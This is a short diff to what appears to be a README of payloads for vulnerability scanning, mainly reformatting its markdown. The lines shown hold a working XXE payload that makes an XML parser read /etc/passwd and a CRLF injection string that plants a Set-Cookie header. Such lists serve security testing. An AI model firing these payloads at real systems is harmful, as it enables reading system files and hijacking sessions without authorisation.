@@ -4,16 +4,16 @@ Payloads for scanning Vulnarability
 
 # XXE Vulnarability Payloads
 
-<?xml version="1.0" encoding="UTF-8" ?>
+``<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [ 
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<foo>&xxe;</foo>
+<foo>&xxe;</foo>``
 
 
-CRLF Injection
-CRLF Injecton Payloads
+
+# CRLF Injecton Payloads
 
 %0d%0aSet-Cookie:%20lang=crlf%3b
 
